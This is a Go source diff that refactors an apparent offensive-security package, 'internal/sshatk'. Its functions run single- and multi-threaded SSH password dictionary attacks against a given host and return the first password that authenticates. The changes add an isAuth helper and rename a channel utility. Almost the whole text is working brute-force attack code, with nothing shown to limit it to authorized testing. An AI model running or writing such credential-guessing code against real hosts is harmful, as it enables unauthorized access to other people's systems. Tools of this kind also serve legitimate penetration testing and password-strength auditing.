@@ -10,8 +10,6 @@ import (
 	"golang.org/x/crypto/ssh"
 )
 
-const AUTH_ERR_SUBSTRING = "ssh: handshake failed: ssh: unable to authenticate"
-
 // dial attempts to establish a connection with the passed credentials. A nil
 // error will be returned if successful and vice versa.
 func dial(addr, port, username, pwd string) error {
@@ -32,9 +30,9 @@ func dial(addr, port, username, pwd string) error {
 	return nil
 }
 
-// sendAfter sends true to the returned channel after the completion of the passed
+// afterFunc sends true to the returned channel after the completion of the passed
 // function.
-func sendAfter(fn func()) chan bool {
+func afterFunc(fn func()) chan bool {
 	c := make(chan bool)
 	go func(fn func(), c chan bool) {
 		fn()
@@ -43,11 +41,23 @@ func sendAfter(fn func()) chan bool {
 	return c
 }
 
+// isAuth returns whether an error is an authentication error or not. Returns false
+// if err is nil.
+func isAuth(err error) bool {
+	if err == nil {
+		return false
+	}
+	return strings.Contains(err.Error(), "ssh: unable to authenticate")
+}
+
 // SSHDictMT performs a multi-threaded dictionary attack with the passed credentials.
 func SSHDictMT(addr, port, username string, pwds []string, goroutines int) (string, error) {
 	pool, _ := workers.NewPool(goroutines)
 
+	// Transmissions over these channels will cause the dictionary attack to be ended
+	// early. A found password or a non-auth error are a good reason to do so.
 	pwdChan, errChan := make(chan string), make(chan error)
+
 	workerWG := &sync.WaitGroup{}
 	workerWG.Add(len(pwds))
 
@@ -63,11 +73,14 @@ func SSHDictMT(addr, port, username string, pwds []string, goroutines int) (stri
 		)
 
 		defer workerWG.Done()
-		if err := dial(addr, port, username, pwd); err != nil {
-			if !strings.Contains(err.Error(), AUTH_ERR_SUBSTRING) {
-				errChan <- err
-			}
+		err := dial(addr, port, username, pwd)
+		if isAuth(err) {
+			// Auth errors are not transmitted over errChan as this causes the pool to
+			// be dismissed.
 			return
+		}
+		if err != nil {
+			errChan <- err
 		}
 		pwdChan <- pwd
 	})
@@ -85,7 +98,7 @@ func SSHDictMT(addr, port, username string, pwds []string, goroutines int) (stri
 		return pwd, nil
 	case err := <-errChan:
 		return "", errors.New("internal/sshatk: failed to connect to host: " + err.Error())
-	case <-sendAfter(workerWG.Wait):
+	case <-afterFunc(workerWG.Wait):
 		return "", errors.New("internal/sshatk: unable to connect with dictionary")
 	}
 }
@@ -93,11 +106,12 @@ func SSHDictMT(addr, port, username string, pwds []string, goroutines int) (stri
 // SSHDictST performs a single-threaded dictionary attack with the passed credentials.
 func SSHDictST(addr, port, username string, pwds []string) (string, error) {
 	for _, pwd := range pwds {
-		if err := dial(addr, port, username, pwd); err != nil {
-			if !strings.Contains(err.Error(), AUTH_ERR_SUBSTRING) {
-				return "", errors.New("internal/sshatk: failed to connect to host: " + err.Error())
-			}
+		err := dial(addr, port, username, pwd)
+		if isAuth(err) {
 			continue
+		}
+		if err != nil {
+			return "", errors.New("internal/sshatk: failed to connect to host: " + err.Error())
 		}
 		return pwd, nil
 	}
